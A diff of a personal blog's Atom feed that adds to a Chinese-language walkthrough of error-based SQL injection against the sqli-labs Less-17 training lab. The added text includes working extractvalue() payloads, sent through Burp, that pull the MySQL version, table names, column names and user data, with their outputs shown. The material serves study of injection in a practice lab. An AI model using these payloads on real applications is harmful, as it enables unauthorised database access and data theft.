@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-14T15:31:14.779Z</updated>
+    <updated>2021-04-15T07:05:58.873Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -80,7 +80,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~5.7.31~'
 </code></pre>
 <h2 id="实践">实践</h2>
 <h3 id="sqli-labs-less-17">sqli-labs Less-17</h3>
-<p>关键性源码</p>
+<h4 id="关键性源码">关键性源码</h4>
 <pre><code>if($row)
 {
     //echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
@@ -123,13 +123,46 @@ else
 </code></pre>
 <p>不管我们怎么输入最后返回结果都是一致的，所以我们试着用报错注入的方式看看，能不能返回我们需要的信息</p>
 <p>这里补充下，源码中还对输入的信息进行了转义，后续的uname参数中的特殊字符都会被转义（那可以绕过不？）</p>
-<h4 id="burp抓包进行修改">Burp抓包进行修改</h4>
+<h4 id="burp抓包">Burp抓包</h4>
 <p>其中uname参数我们可以通过查看数据库（白盒测试）、查看源码、猜（布尔注入？）可以得到</p>
+<p>尝试发送请求，并通过Burp进行抓包修改</p>
+<pre><code>1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#
+</code></pre>
 <figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224913.png" alt="QQ截图20210414224913" loading="lazy"></figure>
 <p>出现了转义，请教师傅后发现是<a href="https://blog.csdn.net/Xiaoxiaoqiang_/article/details/113763674">魔术引号</a>没关，关掉后重新发送</p>
 <figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224511.png" alt="QQ截图20210414224511" loading="lazy"></figure>
-<p>成功~</p>
-<p>这里如果没有关掉魔术引号，可以试试宽字符的方式绕过，具体怎么操作，后续补充</p>
+<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210415143922.png" alt="QQ截图20210415143922" loading="lazy"></figure>
+<p>！！！这里如果没有关掉魔术引号，可以试试宽字符的方式绕过，具体怎么操作，后续补充</p>
+<h4 id="查询表名">查询表名</h4>
+<p>查询表名，并尝试将and前面的内容换一下</p>
+<pre><code>abc' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
+</code></pre>
+<p>这里会出现报错</p>
+<pre><code>Truncated incorrect DOUBLE value: 'abc‘	
+</code></pre>
+<p>很奇怪，改成数字就可以。</p>
+<p>！！！等待解决办法</p>
+<p>换回数字</p>
+<pre><code>123' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~emails,referers,uagents,users~'
+</code></pre>
+<h4 id="查询列名">查询列名</h4>
+<pre><code>123’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
+information_schema.columns where table_schema='security' and table_name='users' limit
+0,1),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~id,username,password~'
+</code></pre>
+<h4 id="获取数据">获取数据</h4>
+<pre><code>123‘ and extractvalue(1,concat(0x7e,(select * from (select username from users limit 0,1) as
+a),0x7e))#
+</code></pre>
+<p>返回</p>
+<pre><code>XPATH syntax error: '~Dumb~'
+</code></pre>
 <h2 id="总结">总结</h2>
 <p>报错注入多用于无法获得回显点的情况下（盲注不好用的情况），使用mysql内置的几个函数之间的特殊性，让数据库将我们想要获得的信息同报错信息一起返回给我们</p>
 ]]></content>
